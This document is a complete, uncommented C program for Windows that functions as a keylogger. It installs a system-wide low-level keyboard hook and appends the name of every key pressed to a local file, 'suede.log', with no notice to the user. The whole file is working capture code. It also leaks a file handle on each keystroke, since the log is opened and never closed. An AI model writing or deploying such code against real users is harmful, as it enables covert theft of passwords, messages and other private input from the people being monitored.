#include <stdio.h>
#include <windows.h>
HHOOK hKeyHook;

__declspec(dllexport) LRESULT CALLBACK
KeyEvent (int nCode, WPARAM wParam, LPARAM lParam) {
  if (
    (nCode == HC_ACTION) &&
    ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))
  ) {
    KBDLLHOOKSTRUCT * hooked = (KBDLLHOOKSTRUCT *) lParam;
    DWORD mesg = 1;
    mesg += hooked->scanCode << 16;
    mesg += hooked->flags << 24;
    char kn[] = "Windows Right";
    GetKeyNameText(mesg, kn, sizeof kn);
    FILE * fpt = fopen("suede.log", "a");
    fprintf(fpt, "_%s", kn);
    fflush(fpt);
  }
  return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

int main() {
  hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeyEvent, 0, 0);
  MSG mg;
  while (GetMessage(&mg, 0, 0, 0)) {
    TranslateMessage(&mg);
    DispatchMessage(&mg);
  }
  return 0;
}
